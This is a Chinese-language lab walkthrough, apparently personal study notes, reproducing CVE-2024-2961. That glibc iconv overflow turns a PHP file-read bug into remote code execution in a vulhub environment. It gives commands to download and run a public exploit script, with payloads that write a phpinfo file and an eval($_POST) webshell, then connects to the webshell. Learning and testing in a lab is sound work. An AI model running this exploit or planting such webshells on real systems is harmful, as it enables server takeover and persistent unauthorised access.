---

---
php利用GNU C Iconv将文件读取变成RCE

GNU C中的iconv（）函数2.39及以前存在缓冲区溢出漏洞，可能会导致应用程序崩溃或覆盖相邻变量。如果一个PHP应用中存在任意文件读取漏洞，攻击者可以利用这个CVE，提升为代码执行漏洞

[https://blog.lexfo.fr/iconv-cve-2024-2961-p1.html](https://blog.lexfo.fr/iconv-cve-2024-2961-p1.html)（漏洞的发现和思考）

[https://blog.lexfo.fr/iconv-cve-2024-2961-p2.html](https://blog.lexfo.fr/iconv-cve-2024-2961-p2.html) （进一步的利用和实践）

[https://blog.lexfo.fr/iconv-cve-2024-2961-p3.html](https://blog.lexfo.fr/iconv-cve-2024-2961-p2.html)

利用vulhub，来启动环境

查看页面，发现这个地址需要一个file key值来实现函数file_get_contents()的文件读取，我们发现，存在将key值传递给file_get_contents()函数的$filename的行为，满足了exploit的实现条件

!![[image.png]]

在py3_10的环境下，执行以下几条命令

安装依赖：

```php
pip install pwntools
pip install https://github.com/cfreal/ten/archive/refs/heads/main.zip
```

下载POC并执行：

实现将`<?=phpinfo();?>` 写入`**shell.php**`** **的效果，实现了文件上传落地的效果

```bash
wget https://raw.githubusercontent.com/ambionics/cnext-exploits/main/cnext-exploit.py
python cnext-exploit.py http://your-ip:8080/index.php "echo '<?=phpinfo();?>' > shell.php"
```

!![[image 1.png]]

尝试上传webshell，并利用蚁剑连接。

```bash
python cnext-exploit.py http://your-ip:8080/index.php "echo '<?=eval($_POST[0]);?>' > webshell.php"
```

!![[image 2.png]]

查看poc

[[CVE-2024-2961 POC]]
